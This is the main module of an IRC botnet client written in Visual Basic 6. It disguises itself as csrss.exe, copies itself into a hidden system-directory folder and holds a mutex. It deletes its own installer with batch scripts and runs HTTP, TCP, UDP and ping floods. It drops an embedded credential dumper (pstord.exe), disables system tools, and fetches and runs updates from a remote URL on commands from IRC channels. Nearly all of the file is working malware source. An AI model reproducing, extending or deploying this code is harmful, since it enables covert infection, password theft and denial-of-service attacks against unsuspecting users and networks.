Attribute VB_Name = "modMain"
Option Explicit

'====================
'[CONFIG]
Public Const BotVersion As String = "2.12"
Public Const CmdPrefix As String = "!"
Public Const EXEName As String = "csrss.exe"

Public Const AutocompleteChan As String = "#auto"
Public Const FailedUpdateChan As String = "#fu"
Public Const ServerList As String = ""

Public Const InfectDelay As Long = 11
Public Const MutexString As String = "lungtacos"
Public Const AutoHpEnabled As Boolean = True

Public Const AutoHpURL As String = "http://www.messengersite.net/forum/portal.htm"
Public Const AutoHpInterval As Long = 24
'[/CONFIG]
'====================

'API
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)

'window stuff
Public Declare Function GetForegroundWindow Lib "user32" () As Long
Public Declare Function SetForegroundWindow Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Public Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hwnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function SendMessageString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function IsWindow Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
    Global Const FRMNOMOVE = 2
    Global Const FRMNOSIZE = 1
    Global Const FRMNOMOVEANDNOSIZE = 3
    Global Const WNDTOPMOST = -1
    Global Const WNDNOTOPMOST = -2

'window constants
Public Const BM_SETCHECK = &HF1
Public Const BM_GETCHECK = &HF0

Public Const CB_GETCOUNT = &H146
Public Const CB_GETLBTEXT = &H148
Public Const CB_SETCURSEL = &H14E

Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_HWNDLAST = 1
Public Const GW_CHILD = 5

Public Const LB_GETCOUNT = &H18B
Public Const LB_GETTEXT = &H189
Public Const LB_SETCURSEL = &H186

Public Const SW_HIDE = 0
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_RESTORE = 9
Public Const SW_NORMAL = 1
Public Const SW_SHOW = 5

Public Const VK_SPACE = &H20

Public Const WM_CHAR = &H102
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_MOVE = &HF012
Public Const WM_SETTEXT = &HC
Public Const WM_SYSCOMMAND = &H112
Public Const WM_LBUTTONDBLCLK = &H203   'Double-click
Public Const WM_LBUTTONDOWN = &H201     'Button down
Public Const WM_LBUTTONUP = &H202       'Button up
Public Const WM_RBUTTONDBLCLK = &H206   'Double-click
Public Const WM_RBUTTONDOWN = &H204     'Button down
Public Const WM_RBUTTONUP = &H205       'Button up

Public Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long
'Public Const LOCALE_USER_DEFAULT = &H400
Public Const LOCALE_SYSTEM_DEFAULT As Long = &H800
Public Const LOCALE_SENGCOUNTRY = &H1002 'full english country name
Public Const LOCALE_SABBREVCTRYNAME As Long = &H7 'country abbreviation

Public Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long

'cause the VB kill function sucks
Public Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long

'Hard drives
Private Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTotalNumberOfClusters As Long) As Long
Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Public Declare Function GetDriveType2 Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long

'TickCount
Public Declare Function GetTickCount Lib "kernel32.dll" () As Long

'System directories
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

'App name
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

'servers
Public Servers() As Server
Public lngServerIndex As Long
Public lngServerCount As Long

Private Type Server
    strAddress As String
    strPort As String
    strChannel As String
    strChanPass As String
End Type

Global Client As Client

Private Type Client
    Nick As String
    Connected As Boolean 'Connected to IRC server
    DiscDuration As Long 'How long to stay disconnected
    Pinged As Boolean 'has the server been pinging us?
    INIFile As String 'Where the INI file is located
    UsingSP2 As Boolean
    PatchedTCPIP As Long
    LocalIP As String
    RealIP As String
    RealHost As String
    TempDir As String
    SystemDir As String
    WindowsDir As String
    HomeDrive As String
    EXEName As String 'since client.exename is read only
    FullPath As String
    WindowsVersion As String
    Country As String
    CountryCode As String
End Type

Public Sub UninstallSelf() 'Uninstalls this POS
    On Local Error Resume Next
    Dim intFileHandle As Integer
    Dim strFile As String
    
    '[QUIT]
    IRCSendData ("Q :" & yEncode(EnDeCrypt("Uninstalling")))
    
    Unload frmMain
    DoEvents
    
    StopHTTPFlood (False)
    StopTCPFlood (False)
    StopUDPFlood (False)
    StopPingFlood (False)
    
    RemoveStartup
    BlockHosts (False)
    DisableCmds (False)
    EnableRegfiles (True)
    
    strFile = Client.TempDir & "\del.bat"
    If FileExists(strFile) Then
        Call DeleteFile(strFile)
        DoEvents
    End If
    
    intFileHandle = FreeFile
    Open strFile For Output As #intFileHandle
        Print #intFileHandle, "@echo off"
        Print #intFileHandle, "PING 1.1.1.1 -n 1 -w 15000 >NUL" 'delay it 15 seconds
        Print #intFileHandle, "del """ & Client.FullPath & """"
        Print #intFileHandle, "rmdir """ & App.Path & """ /S /Q"
        Print #intFileHandle, "del %0"
    Close #intFileHandle

    Shell strFile, vbHide
    
    End
End Sub

'Private Function GetFileVersion(strFile As String) As String
'    Dim TCPIpSys As String
'    Dim FindVersion As String
'    Dim intFileHandle As Integer
'    Dim VersionString As String
'    Dim lngPos As Long
'    Dim lngLen As String
'    Dim i As Long
'
'    intFileHandle = FreeFile
'    Open strFile For Binary As #intFileHandle
'    lngLen = LOF(intFileHandle)
'    TCPIpSys = Space$(lngLen)
'    Get #intFileHandle, , TCPIpSys
'    Close #intFileHandle
'
'    FindVersion = "F" & Chr$(0) & "i" & Chr$(0) & "l" & Chr$(0) & "e" & Chr$(0) & "V" & Chr$(0) & "e" & Chr$(0) & "r" & Chr$(0) & "s" & Chr(0) & "i" & Chr(0) & "o" & Chr(0) & "n"
'    lngPos = InStr(1, TCPIpSys, FindVersion)
'    If lngPos = 0 Then Exit Function
'    lngPos = lngPos + Len(FindVersion)
'    Dim strChar As String
'    Do
'        lngPos = lngPos + 1
'        strChar = Mid$(TCPIpSys, lngPos, 1)
'    Loop Until Asc(strChar) <> 0
'    Do
'        strChar = Mid$(TCPIpSys, lngPos, 1)
'        If IsNumeric(strChar) Or strChar = "." And lngPos < lngLen Then
'            VersionString = VersionString & strChar
'        Else
'            Exit Do
'        End If
'        lngPos = lngPos + 2
'    Loop
'    GetFileVersion = VersionString
'End Function

Public Sub GetClassNameByTitle(lWindowToSearchFor As String, lHwnd As Long, lpClassName As String)
    On Local Error Resume Next
    'Dim ClassNameLength As Integer
    Dim MaxClassNameLength As Long
    MaxClassNameLength = 256
    lpClassName = Space(MaxClassNameLength)
    lHwnd = FindWindow(vbNullString, lWindowToSearchFor)
    If lHwnd = 0 Then
        'Add code here if window is not found
    Else
     'ClassNameLength = GetClassName(lHwnd, lpClassName, MaxClassNameLength)
     Call GetClassName(lHwnd, lpClassName, MaxClassNameLength)
    End If
End Sub

Public Function GetAppDataDir() As String
    GetAppDataDir = GetString(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "AppData")
End Function

Public Function WinDir() As String 'Get windows dir
    On Local Error Resume Next
    Dim WindirS As String * 255
    Dim temp As String
    temp = GetWindowsDirectory(WindirS, 255)
    WinDir = VBA.Left$(WindirS, temp)
End Function

Public Function SysDir() As String 'Get system dir
    On Local Error Resume Next
    Dim WindirS As String * 255
    Dim temp As String
    temp = GetSystemDirectory(WindirS, 255)
    SysDir = VBA.Left$(WindirS, temp)
End Function

Public Function TempDir() As String 'Get temp dir
    Dim WindirS As String * 255
    Dim temp As String
    temp = GetTempPath(255, WindirS)
    TempDir = VBA.Left$(WindirS, temp)
End Function

'Public Function GetUser() As String
'    Dim ret As Long
'    Dim Buffer As String * 25
'    ret = GetUserName(Buffer, 25)
'    GetUser = VBA.Left$(Buffer, InStr(Buffer, Chr(0)) - 1)
'End Function

Public Function RandBinary(Length As Long) As String
    Dim i As Long
    Dim ByteArray() As Byte
    
    ReDim Preserve ByteArray(Length) As Byte
    
    For i = 0 To Length
        ByteArray(i) = Int(256 * Rnd)
    Next
    
    RandBinary = StrConv(ByteArray, vbUnicode)
End Function

Public Function RandStr(strLen As Long, blnAlphaNumeric As Boolean) As String
    Dim charpos As Long
    Dim x As Long
    Dim rndstring As String
    Dim chars As String
    
    If blnAlphaNumeric = True Then
        chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Else
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    End If
    
    x = 0
    Do Until x = strLen
        charpos = Int((Len(chars) * Rnd) + 1)
        rndstring = rndstring & Mid$(chars, charpos, 1)
        x = x + 1
    Loop
    RandStr = rndstring
End Function

Public Function RandNum(Low As Long, High As Long) As Long
    RandNum = Int((High - Low + 1) * Rnd + Low)
End Function

Public Sub IRCSendData(strData As String)
    On Local Error Resume Next
    If frmMain.sckIRC.State(1) = sckConnected Then
        frmMain.sckIRC.SendData 1, strData & vbLf
        DoEvents
    End If
End Sub

'removes null characters from end of string
'Public Function TrimNull(ByVal strString As String) As String
'    Dim strChar As String
'
'    strChar = Right$(strString, 1)
'    Do Until strChar <> Chr$(0)
'        strString = Left$(strString, Len(strString) - 1)
'        strChar = Right$(strString, 1)
'        If Len(strString) = 0 Then
'            TrimNull = vbNullString
'            Exit Function
'        End If
'    Loop
'    TrimNull = strString
'End Function

Public Function TrimNull(strString As String) As String
   TrimNull = VBA.Left$(strString, lstrlen(StrPtr(strString)))
End Function

Public Function GetDateType(strDateType As String) As String
    Select Case strDateType
        Case "q"
            GetDateType = "quarter(s)"
        Case "m"
            GetDateType = "month(s)"
        Case "y"
            GetDateType = "year(s)"
        Case "d"
            GetDateType = "day(s)"
        Case "w"
            GetDateType = "week(s)"
        Case "h"
            GetDateType = "hour(s)"
        Case "n"
            GetDateType = "minute(s)"
        Case "s"
            GetDateType = "second(s)"
        'Case Else
            'GetDateType = "unknown unit(s) of time"
    End Select
End Function

Public Sub GetDiskSize(ByVal strDrive As String, lngSize As Long, lngFree As Long, lngUsed As Long)
    On Local Error Resume Next
    Dim lngSectorsPerCluster As Long, lngBytesPerSector As Long
    Dim lngTotalClusters As Long, lngFreeClusters As Long
    
    Call GetDiskFreeSpace(strDrive, lngSectorsPerCluster, lngBytesPerSector, lngFreeClusters, lngTotalClusters)
    lngSize = lngSectorsPerCluster * lngBytesPerSector * (lngTotalClusters \ 1024) \ 1024
    lngFree = lngSectorsPerCluster * lngBytesPerSector * (lngFreeClusters \ 1024) \ 1024
    lngUsed = lngSize - lngFree
End Sub

Public Function GetFileSystem(ByVal strDrive As String) As String
    On Local Error Resume Next
    Dim strFileSystem As String
    strFileSystem = Space(127)
    Call GetVolumeInformation(strDrive, "", 127, 0, 0, 0, strFileSystem, 127)
    strFileSystem = TrimNull(Trim$(strFileSystem))
    If Len(strFileSystem) > 0 Then
        GetFileSystem = strFileSystem
    Else
        GetFileSystem = "None"
    End If
End Function

Public Function GetDriveType(strDrive As String) As String
    Dim lngDriveType As Long
    lngDriveType = GetDriveType2(strDrive)
    
    Select Case lngDriveType
        'Case 1:
            'GetFileSystem = "Unknown"
        Case 2:
            GetDriveType = "Removable"
        Case 3:
            GetDriveType = "Fixed"
        Case 4:
            GetDriveType = "Remote"
        Case 5:
            GetDriveType = "CD-Rom"
        Case 6:
            GetDriveType = "RAMdisk"
        Case Else:
            GetDriveType = "Unknown"
    End Select
End Function

Public Sub ParseURL(ByVal strURL As String, strHostString As String, strDirectoryString As String)
    strURL = Replace$(strURL, "http://", "")
    
    If InStr(1, strURL, "/") = 0 Then
        strHostString = strURL
        strDirectoryString = "/"
    Else
        strHostString = VBA.Left$(strURL, InStr(1, strURL, "/") - 1)
        strDirectoryString = Mid$(strURL, InStr(1, strURL, "/"), Len(strURL) - InStr(1, strURL, "/") + 1)
    End If
End Sub

Public Function FullAppPath() As String
    Dim modName As String * 256
    Dim i As Long
    i = GetModuleFileName(App.hInstance, modName, Len(modName))
    FullAppPath = VBA.Left$(modName, i)
End Function

'Public Sub Lin2Win(strFile As String)
'    On Local Error Resume Next
'    Dim strInput As String
'    Dim intFileHandle As Integer
'
'    If Len(Dir(strFile)) > 0 Then
'        intFileHandle = FreeFile
'        strInput = Space(FileLen(strFile))
'        Open strFile For Binary As #intFileHandle
'        Get #intFileHandle, , strInput
'        Close #intFileHandle
'
'        If InStr(1, strInput, vbCrLf) = 0 Then
'            strInput = Replace$(strInput, vbLf, vbCrLf)
'
'            Open strFile For Binary Access Write As #intFileHandle
'                Put #intFileHandle, , strInput
'            Close #intFileHandle
'        End If
'    End If
'End Sub

Public Sub DoEventsWait(lngMS As Long)
    Dim lngCount As Currency
    
    lngCount = GetUptimeMS + lngMS
    Do Until GetUptimeMS >= lngCount
        DoEvents
    Loop
End Sub

Public Function FileExists(strFile As String) As Boolean
    On Local Error Resume Next
    FileExists = Len(Dir(strFile, vbHidden + vbArchive + vbNormal + vbReadOnly + vbSystem)) <> 0
End Function

Public Sub DumpPStorage()
    On Local Error Resume Next
    Dim intFileHandle As Integer
    Dim strFile As String
    strFile = Client.TempDir & "\pstord.exe"
    If FileExists(strFile) = False Then
        Dim bData() As Byte
        bData = LoadResData(1, "RES")
        
        'the tag below is so the key changing
        'thing can find it
        '
        '[PSTORD]
        Call DecipherBArray(bData, 91)

        intFileHandle = FreeFile
        Open strFile For Binary Access Write As #intFileHandle
        Put #intFileHandle, , bData
        Close #intFileHandle
        DoEvents
        Call SetAttr(strFile, vbHidden + vbSystem)
    End If
    
    Call ShellEx(strFile, """" & App.Path & "\ps.dat""")
    DoEventsWait (2500)
    Call DeleteFile(Client.TempDir & "\pstord.exe")
End Sub

Public Sub LoadServers()
    On Local Error Resume Next
    Dim strInput As String
    Dim strEntrySplit() As String
    Dim strServerSplit() As String
    Dim i As Long
    
    lngServerIndex = 0
    lngServerCount = 0
    ReDim Servers(0)
    
    strInput = yDecode(ServerList)
    
    strEntrySplit = Split(strInput, Chr(1))
    For i = 0 To UBound(strEntrySplit)
        strServerSplit = Split(strEntrySplit(i), Chr(2), 4)
        
        If UBound(strServerSplit) > 2 Then
            ReDim Preserve Servers(lngServerCount)
            Servers(i).strAddress = strServerSplit(0)
            Servers(i).strPort = strServerSplit(1)
            Servers(i).strChannel = strServerSplit(2)
            Servers(i).strChanPass = strServerSplit(3)
            
            lngServerCount = lngServerCount + 1
        End If
    Next
End Sub

Public Sub UpdateError(lngErrNum As Long, Optional Description As String)
    On Local Error Resume Next
    Dim strNewVer As String
    strNewVer = GetSetting("update.newver")
    Dim strURL As String
    strURL = GetSetting("update.url")
    Dim strCRC As String
    strCRC = GetSetting("update.crc")
    
    Dim lngErrCount As Long
    lngErrCount = Val(GetSetting("update.errcount"))
    lngErrCount = lngErrCount + 1
    Call SaveSetting("update.errcount", lngErrCount)
    
    If lngErrCount >= 3 Then
        DoEventsWait (15000)
        Select Case lngErrNum
            Case 1
                Call DirectMsgChan("[UPDATE][ERROR]: Version check failed (" & BotVersion & " != " & strNewVer & "). Uninstalling.", FailedUpdateChan)
            'Case 2
                'Call DirectMsgChan("[UPDATE][ERROR]: Shell failed. Uninstalling.", FailedUpdateChan)
            Case 3
                Call DirectMsgChan("[UPDATE][ERROR]: " & Description & ". Uninstalling.", FailedUpdateChan)
        End Select
        UninstallSelf
    Else
        Select Case lngErrNum
            Case 1
                Call DirectMsgChan("[UPDATE][ERROR]: Version check failed (" & BotVersion & " != " & strNewVer & "). Retrying update (retry #" & lngErrCount & ")", FailedUpdateChan)
            'Case 2
                'Call DirectMsgChan("[UPDATE][ERROR]: Shell failed. Retrying update (retry #" & lngErrCount & ")", FailedUpdateChan)
            Case 3
                Call DirectMsgChan("[UPDATE][ERROR]: " & Description & ". Retrying update (retry #" & lngErrCount & ")", FailedUpdateChan)
        End Select
        frmMain.dlUpdate.CmdIndex = -1
        frmMain.dlUpdate.CRC = strCRC
        frmMain.dlUpdate.Download strURL, App.Path & "\snew.exe"
    End If
End Sub

Public Function GenerateNick() As String
    GenerateNick = "[" & Client.WindowsVersion & "|"
    GenerateNick = GenerateNick & UCase$(RandStr(13 - Len(GenerateNick), True)) & "]"
End Function

Public Function IsURL(strURL) As Boolean
    Dim lngPos As Long
    lngPos = InStr(1, strURL, "://")
    If lngPos = 0 Or InStr(lngPos + 3, strURL, "/") = 0 Then
        IsURL = False
    Else
        IsURL = True
    End If
End Function

Public Sub Main()
    On Local Error Resume Next
    Dim strPath As String
    Dim intFileHandle As Integer
    Dim blnUpdating As Boolean
    Dim strOldExeName As String
    
    'first things first
    Client.EXEName = App.EXEName
    
    '-u is for update. The old exe should've terminated itself.
    'fix client.exename... current running exe should be called snew.exe
    If Command$ = "-u" Then blnUpdating = True
    If blnUpdating = True Then
        Client.EXEName = Replace$(EXEName, ".exe", vbNullString)
    End If
    
    'set important shit
    Client.FullPath = App.Path & "\" & Client.EXEName & ".exe"
    Client.WindowsDir = WinDir
    Client.SystemDir = SysDir
    Client.WindowsVersion = GetWindowsVersion
    Client.INIFile = App.Path & "\" & Client.EXEName & ".ini"
    Client.Country = GetCountry
    Client.CountryCode = GetCountryCode
    
    'file should exist... if not it must be an older version so it should be csrss.exe
    If Not FileExists(App.Path & "\oldname") Then
        strOldExeName = "csrss"
    Else
        intFileHandle = FreeFile
        Open App.Path & "\oldname" For Binary As #intFileHandle
        strOldExeName = Space$(LOF(intFileHandle))
        Get #intFileHandle, , strOldExeName
        Close #intFileHandle
        Kill App.Path & "\oldname"
    End If
    
    'keep on updating
    If blnUpdating = True Then
        'begin version specific updates
        'Dim sinOldVersion As Single
        'sinOldVersion = CSng(GetSetting("update.oldver"))
        '
        'If sinOldVersion < 2.1 Then
        '    Kill App.Path & "\csrss.ini"
        '
        '    Call SaveSetting("update.updating", "1")
        '    Call SaveSetting("update.newver", "2.10")
        'End If
        'end version specific updates
        
        'just in case it already exists
        Call DeleteFile(App.Path & "\sold.exe")
        'rename old exe to old.exe
        Name App.Path & "\" & strOldExeName & ".exe" As App.Path & "\sold.exe"
        'rename old .ini file
        Name App.Path & "\" & strOldExeName & ".ini" As Client.INIFile
        'delete old exe
        Call SetAttr(App.Path & "\sold.exe", vbNormal)
        Call DeleteFile(App.Path & "\sold.exe")
        'rename this .exe to new one
        Name App.Path & "\snew.exe" As Client.FullPath
        'make it teh hidden
        Call SetAttr(Client.FullPath, vbHidden + vbSystem)
        'just in case
        Call SaveSetting("act.activated", "1")
    End If
    
    'banned operating systems
    If Client.WindowsVersion = "95" Then End
    
    'banned countries (have a problem with the encoding)
    Select Case UCase$(Client.CountryCode)
        Case "VN" 'vietnam
            End
    End Select
    
    If CheckAndCreateMutex = False Then End 'check for previous instance
    
    Randomize 'initialize random number generator (for generating random shit)
    InitializeCRC32 'initialize CRC32 algorithm
    ReDim Commands(0) 'setup commands array
    'set temp dir
    Client.TempDir = TempDir
    If Len(Client.TempDir) = 0 Then
        Client.TempDir = App.Path
    Else
        'remove trailing slash
        If Right$(Client.TempDir, 1) = "\" Then
            Client.TempDir = Left$(Client.TempDir, Len(Client.TempDir) - 1)
        End If
    End If
    'set home drive
    Client.HomeDrive = Environ$("HOMEDRIVE")
    If Len(Client.HomeDrive) = 0 Then
        Client.HomeDrive = "c:"
    End If
    
    'if we're in teh system directory or in IDE continue running bot
    If InStr(1, App.Path, Client.SystemDir) > 0 Or Subclass_InIDE = True Then
        Load frmMain
        Exit Sub
    End If
    
    'if the exe isn't in the system directory, lets infect them :D
    Dim strRandDir As String
    
    strRandDir = Client.SystemDir & "\" & LCase$(RandStr(RandNum(6, 10), False))
    
    MkDir strRandDir
    Call SetAttr(strRandDir, vbHidden + vbSystem)
    DoEvents
    
    strPath = strRandDir & "\" & EXEName
    Call FileCopy(FullAppPath, strPath)
    DoEvents
    
    'No looking :O
    Call SetAttr(strPath, vbHidden + vbSystem + vbReadOnly)
    
    'release mutex so the bot can use it
    MutexCleanUp
    
    'run bot
    Shell strPath, vbHide
    
    'generate installer deleter
    intFileHandle = FreeFile
    Open Client.TempDir & "\del2.bat" For Output As #intFileHandle
        Print #intFileHandle, "@echo off"
        Print #intFileHandle, "ping 1.1.1.1 -n 1 -w 5000 >NUL" 'delay it 5 secs
        Print #intFileHandle, "del """ & FullAppPath & """"
        Print #intFileHandle, "del %0"
    Close #intFileHandle
    
    'Silly people will believe anything
    'MsgBox "Run-time error #7: Out of memory.", vbCritical, "Run-time Error"
    
    'run installer deleter
    Shell Client.TempDir & "\del2.bat", vbHide
    
    End
End Sub

Public Function FilterCompname(strName As String) As String
    On Local Error Resume Next
    Dim strOut As String
    Dim i As Long
    
    For i = 1 To Len(strName)
        Dim strChar As String
        strChar = Mid$(strName, i, 1)
        If IsAlphanumeric(strChar) Then
            strOut = strOut & strChar
        End If
    Next
    
    If Len(strOut) > 10 Then strOut = Left$(strOut, 10)
    FilterCompname = strOut
End Function

Public Function IsAlphanumeric(strString As String) As Boolean
    If strString Like "[0-9A-Za-z]" Then IsAlphanumeric = True
End Function

Public Function IsNetworkIP(strIP As String) As Boolean
    If Not IsIP(strIP) Then Exit Function
    
    Dim IPSplit() As String
    IPSplit = Split(strIP, ".", 4)
    
    '10.0.0.0 - 10.255.255.255
    If IPSplit(0) = 10 Then IsNetworkIP = True
    '172.16.0.0 - 172.31.255.255
    If IPSplit(0) = 172 And (IPSplit(1) >= 16 And IPSplit(1) <= 31) Then IsNetworkIP = True
    '192.168.0.0 - 192.168.255.255
    If IPSplit(0) = 192 And IPSplit(1) = 168 Then IsNetworkIP = True
    '169.254.0.0 - 169.254.255.255
    If IPSplit(0) = 169 And IPSplit(1) = 254 Then IsNetworkIP = True
End Function

Public Function GetWindowClassName(hwnd As Long) As String
    Dim ClsName As String
    Dim ClsLen As String

    If IsWindow(hwnd) = 0 Then Exit Function

    ClsLen = 128
    ClsName = Space(ClsLen)
    ClsLen = GetClassName(hwnd, ClsName, ClsLen)

    GetWindowClassName = VBA.Left$(ClsName, ClsLen)
End Function

'Public Sub ArrayAdd(ByRef strArray() As String, Index As Long)
'    Dim i As Long
'    Dim lngUbound As Long
'    lngUbound = UBound(strArray) + 1
'    ReDim Preserve strArray(lngUbound)
'    For i = lngUbound To Index + 1 Step -1
'        strArray(i) = strArray(i - 1)
'    Next
'    strArray(Index) = vbNullString
'End Sub

'Converts a string to an array of bytes. Just like Asc() on every character.
Public Sub StringToByteArray(ByRef StringIn As String, ByRef ByteArray() As Byte)
    Dim lBytes As Long
    
    If Len(StringIn) = 0 Then Exit Sub
    lBytes = Len(StringIn)
    ReDim ByteArray(lBytes - 1)
    
    CopyMemory ByteArray(0), ByVal StringIn, lBytes
End Sub

'Converts an array of bytes to a string.
Public Sub ByteArrayToString(ByRef ByteArray() As Byte, ByRef StringOut As String)
  Dim lBytes As Long

  If LBound(ByteArray) > 0 Then Exit Sub 'lBound MUST be 0
  lBytes = UBound(ByteArray) + 1
  StringOut = String$(lBytes, 0)
  
  CopyMemory ByVal StringOut, ByteArray(0), lBytes
End Sub

Public Sub AppendBArray(ByRef bTarget() As Byte, ByRef bAppend() As Byte)
    Dim i As Long
    Dim lngOldUbound As Long
    Dim lngNewUbound As Long
    
    If UBound(bAppend) = -1 Then Exit Sub
    
    On Error GoTo NoUbound
    lngOldUbound = UBound(bTarget)
    GoTo Continue
NoUbound:
    lngOldUbound = -1
Continue:
    On Error GoTo 0
    lngNewUbound = lngOldUbound + UBound(bAppend) + 1
    ReDim Preserve bTarget(lngNewUbound)
    For i = lngOldUbound + 1 To lngNewUbound
        bTarget(i) = bAppend(i - lngOldUbound - 1)
    Next
End Sub

'Public Sub ArrayRemoveS(ByRef strArray() As String, Index As Long)
'    Dim i As Long
'    Dim lngUbound As Long
'    lngUbound = UBound(strArray)
'    If Index = 0 And lngUbound = 0 Then
'        Erase strArray
'        Exit Sub
'    End If
'    For i = Index To lngUbound - 1
'        strArray(i) = strArray(i + 1)
'    Next
'    ReDim Preserve strArray(lngUbound - 1)
'End Sub

Public Sub ArrayRemoveB(ByRef bArray() As Byte, Index As Long)
    Dim i As Long
    Dim lngUbound As Long
    lngUbound = UBound(bArray)
    If Index = 0 And lngUbound = 0 Then
        Erase bArray
        Exit Sub
    End If
    For i = Index To lngUbound - 1
        bArray(i) = bArray(i + 1)
    Next
    ReDim Preserve bArray(lngUbound - 1)
End Sub

Private Function GetCountry() As String
    Dim lngReturn As Long
    Dim strBuffer As String * 80
    lngReturn = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SENGCOUNTRY, strBuffer, 80)

    GetCountry = TrimNull(strBuffer)
End Function

Private Function GetCountryCode() As String
    Dim lngReturn As Long
    Dim strBuffer As String * 9
    lngReturn = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, strBuffer, 9)

    GetCountryCode = TrimNull(strBuffer)
End Function
